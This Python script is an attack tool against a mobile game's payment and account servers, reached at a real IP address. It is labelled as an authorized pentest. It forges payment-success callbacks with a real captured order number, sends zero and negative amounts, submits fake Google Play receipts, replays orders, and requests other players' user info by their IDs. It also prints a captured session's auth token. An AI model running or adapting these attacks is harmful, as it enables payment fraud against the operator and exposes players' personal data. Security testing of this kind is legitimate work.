"""
CRITICAL: Payment Endpoint Bypass Tests — com.h5bi.winr v1.0.1
Endpoints: /v1/payment/paySuccess, /v1/auth/createOrder

SCOPE: Authorized pentest only. Tests for:
  1. Payment callback forgery (/v1/payment/paySuccess without real payment)
  2. Order ID replay attacks
  3. Parameter tampering (amount, currency, product)
  4. Google Play receipt forgery (/v1/user/postGooglePlayVerify)
  5. Missing server-side validation

Smali-confirmed /v1/payment/paySuccess params (com.qk.a.a.c.b$5.run()):
  uid, username, orderAmount, cpOrderNo, goodsID, goodsName, currency,
  gameRoleId, gameRoleName, gameRoleLevel, gameRoleServerId, gameRoleServerName
  + sign params added by b.a(HashMap): uid, username, token, sign, os, usermode, appKey

PREREQUISITE: Fill CAPTURED_SESSION from Frida/Burp output.

Usage: python3 02_payment_bypass.py
"""

import json
import time
import uuid
import urllib3
import requests
from sign_helper import QuickGameSession, SESSION, SERVERS, SIGN_KEY_PAYMENT, md5, SERVER_LOGIN, SERVER_PAY

urllib3.disable_warnings()


# ── Live-captured session (Frida 2025-06-09) ─────────────────────────────────
# cpOrderNo from captured payment flow: 6c5a894fe7a4481cff0c2f554242f3e6
#   goodsId: com.h5bi.winr.05 (PermanentPassx1)
CAPTURED_SESSION = SESSION
CAPTURED_ORDER_ID = "6c5a894fe7a4481cff0c2f554242f3e6"

# Use IP direct with Host header (DNS blocked, IP is reachable)
PAY_SERVER  = SERVER_PAY    # https://47.89.242.44:520 + Host: pay.popoh5.com
AUTH_SERVER = SERVER_LOGIN  # https://47.89.242.44:510 + Host: login.popoh5.com


def log(label: str, resp: requests.Response):
    print(f"\n{'='*55}")
    print(f"  TEST: {label}")
    print(f"  URL:  {resp.url}")
    print(f"  Status: {resp.status_code}")
    try:
        data = resp.json()
        print(f"  JSON: {json.dumps(data, indent=2)[:500]}")
    except Exception:
        print(f"  Body: {resp.text[:400]}")


def safe_post(endpoint: str, data: dict = None, pay_sign: bool = False,
              servers=None) -> None:
    """Try endpoint on multiple servers, print result or timeout for each."""
    target_servers = servers or [(None, CAPTURED_SESSION.server)]
    for name, srv in target_servers:
        label = f"{name or 'default'} {srv}"
        try:
            resp = CAPTURED_SESSION.post(endpoint, data=data, server=srv,
                                         pay_sign=pay_sign)
            log(f"{endpoint} [{name}]", resp)
            return  # stop at first response
        except requests.exceptions.ConnectTimeout:
            print(f"\n  [TIMEOUT] {label}{endpoint}")
        except requests.exceptions.ConnectionError as e:
            print(f"\n  [CONN ERR] {label}{endpoint}: {e}")


# ─── Test 1: Direct paySuccess call with crafted order ────────────────────────
def test_paysuccess_forgery():
    """
    Attempt to notify the server of a successful payment without completing one.
    The server should validate the payment against the payment provider,
    but if it trusts the client — this grants in-game currency.
    """
    fake_order_id = f"PENTEST_{int(time.time())}_{uuid.uuid4().hex[:8].upper()}"

    # Typical paySuccess params inferred from QuickGame SDK source
    payloads = [
        # Payload 1: Minimal — just order ID
        {
            "orderId":     fake_order_id,
            "payType":     "google",
            "productId":   "com.h5bi.winr.crystal_01",
            "productName": "Crystal Pack",
            "amount":      "0.99",
            "currencyType": "USD",
            "extra":       "{}",
        },
        # Payload 2: With receipt token (empty / malformed)
        {
            "orderId":      fake_order_id + "_2",
            "payType":      "google",
            "purchaseToken": "FORGED_TOKEN_" + uuid.uuid4().hex,
            "productId":    "com.h5bi.winr.crystal_01",
            "amount":       "0.99",
            "receipt":      "{}",
        },
        # Payload 3: amount=0 (zero-value order)
        {
            "orderId":     fake_order_id + "_3",
            "payType":     "google",
            "productId":   "com.h5bi.winr.vip_pack",
            "amount":      "0.00",
            "currencyType": "USD",
        },
    ]

    for i, payload in enumerate(payloads):
        # paySuccess lives on the payment server, try all if needed
        safe_post("/v1/payment/paySuccess", data=payload,
                  servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])


# ─── Test 1b: paySuccess with EXACT smali-confirmed params ───────────────────
def test_paysuccess_exact_params():
    """
    CRITICAL PoC — use REAL cpOrderNo from Frida-captured payment flow.
    cpOrderNo=6c5a894fe7a4481cff0c2f554242f3e6 (PermanentPassx1, com.h5bi.winr.05)
    If server doesn't validate against payment provider → account credited for free.
    """
    base_payload = {
        "orderAmount":       "0.99",
        "cpOrderNo":         CAPTURED_ORDER_ID,
        "goodsID":           "com.h5bi.winr.05",
        "goodsName":         "PermanentPassx1",
        "currency":          "USD",
        "gameRoleId":        "1",
        "gameRoleName":      "TestHero",
        "gameRoleLevel":     "1",
        "gameRoleServerId":  "1",
        "gameRoleServerName": "Server1",
    }
    safe_post("/v1/payment/paySuccess", data=base_payload, pay_sign=True,
              servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])

    # Also try with a fresh fake order — tests if ANY forged order is accepted
    fake_payload = dict(base_payload)
    fake_payload["cpOrderNo"] = f"PENTEST_{int(time.time())}"
    safe_post("/v1/payment/paySuccess", data=fake_payload, pay_sign=True,
              servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])


# ─── Test 2: createOrder parameter tampering ──────────────────────────────────
def test_create_order_tamper():
    """
    Create order with manipulated amount — test if server validates server-side.
    """
    test_cases = [
        {"productId": "com.h5bi.winr.crystal_01", "amount": "0.01",   "currencyType": "USD"},
        {"productId": "com.h5bi.winr.crystal_big", "amount": "-1.00", "currencyType": "USD"},
        {"productId": "com.h5bi.winr.crystal_01",  "amount": "0.00",  "currencyType": "USD"},
        {"productId": "com.h5bi.winr.vip_999",     "amount": "0.99",  "currencyType": "USD"},
    ]

    for i, data in enumerate(test_cases):
        safe_post("/v1/auth/createOrder", data=data,
                  servers=[("login", AUTH_SERVER), ("pay", PAY_SERVER)])


# ─── Test 3: Google Play receipt forgery ─────────────────────────────────────
def test_google_play_receipt_forge():
    """
    Submit a forged Google Play receipt — if server doesn't call Google's API to verify,
    it may credit the account.
    """
    import base64, os as _os
    fake_receipt = {
        "packageName":   "com.h5bi.winr",
        "productId":     "com.h5bi.winr.crystal_01",
        "purchaseTime":  int(time.time() * 1000),
        "purchaseState": 0,
        "purchaseToken": "forged_" + uuid.uuid4().hex * 2,
        "orderId":       f"GPA.3300-1234-5678-{uuid.uuid4().hex[:5].upper()}",
        "autoRenewing":  False,
        "acknowledged":  False,
    }
    fake_sig = base64.b64encode(_os.urandom(256)).decode()

    payloads = [
        {"receipt": json.dumps(fake_receipt), "productId": "com.h5bi.winr.crystal_01",
         "orderId": fake_receipt["orderId"]},
        {"receipt": json.dumps(fake_receipt), "signature": fake_sig,
         "productId": "com.h5bi.winr.crystal_01", "orderId": fake_receipt["orderId"]},
        {"purchaseToken": fake_receipt["purchaseToken"],
         "productId": "com.h5bi.winr.crystal_01", "packageName": "com.h5bi.winr"},
    ]

    for i, payload in enumerate(payloads):
        safe_post("/v1/user/postGooglePlayVerify", data=payload,
                  servers=[("login", AUTH_SERVER), ("pay", PAY_SERVER)])


# ─── Test 4: Order replay attack ──────────────────────────────────────────────
def test_order_replay(real_order_id: str = None):
    """
    Replay a real orderId to get credited twice (idempotency check).
    """
    if not real_order_id:
        print("\n[SKIP] Order replay — no real_order_id")
        return

    payload = {
        "orderId":      real_order_id,
        "payType":      "google",
        "productId":    "com.h5bi.winr.crystal_01",
        "amount":       "0.99",
        "currencyType": "USD",
    }

    for attempt in range(3):
        safe_post("/v1/payment/paySuccess", data=payload,
                  servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
        time.sleep(1)


# ─── Test 5: getUserInfo IDOR ─────────────────────────────────────────────────
def test_idor_getuserinfo():
    """
    IDOR: authenticated as uid=A, request uid=B — if it returns B's data, confirmed.
    """
    own_uid = int(CAPTURED_SESSION.uid)
    test_uids = [str(own_uid + i) for i in range(-3, 4) if i != 0]

    print("\n" + "="*55)
    print("  TEST: IDOR — getUserInfo with other UIDs")

    for target_uid in test_uids:
        try:
            resp = CAPTURED_SESSION.get("/v1/auth/getUserInfo",
                                        extra_params={"uid": target_uid},
                                        server=AUTH_SERVER)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get("code") == 0:
                        print(f"  [IDOR ✓] uid={target_uid} => {json.dumps(data)[:200]}")
                    else:
                        print(f"  [OK 200] uid={target_uid} code={data.get('code')} msg={data.get('msg')}")
                except Exception:
                    print(f"  [200] uid={target_uid} => {resp.text[:100]}")
            else:
                print(f"  [{resp.status_code}] uid={target_uid}")
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError) as e:
            print(f"  [TIMEOUT/ERR] uid={target_uid}: {e}")


if __name__ == "__main__":
    print("[*] Payment Bypass Tests — com.h5bi.winr v1.0.1")
    print(f"    uid:       {CAPTURED_SESSION.uid}")
    print(f"    username:  {CAPTURED_SESSION.username}")
    print(f"    authToken: {CAPTURED_SESSION.authToken}")
    print(f"    server:    {CAPTURED_SESSION.server}")
    print(f"    cpOrderNo: {CAPTURED_ORDER_ID}\n")

    print("[*] TEST 1: paySuccess forgery (generic)")
    test_paysuccess_forgery()

    print("\n[*] TEST 1b: paySuccess REAL cpOrderNo (CRITICAL PoC)")
    test_paysuccess_exact_params()

    print("\n[*] TEST 2: createOrder parameter tampering")
    test_create_order_tamper()

    print("\n[*] TEST 3: Google Play receipt forgery")
    test_google_play_receipt_forge()

    print("\n[*] TEST 4: Order replay (real order required)")
    test_order_replay(CAPTURED_ORDER_ID)

    print("\n[*] TEST 5: IDOR getUserInfo")
    test_idor_getuserinfo()

    print("\n[*] Payment tests complete.")
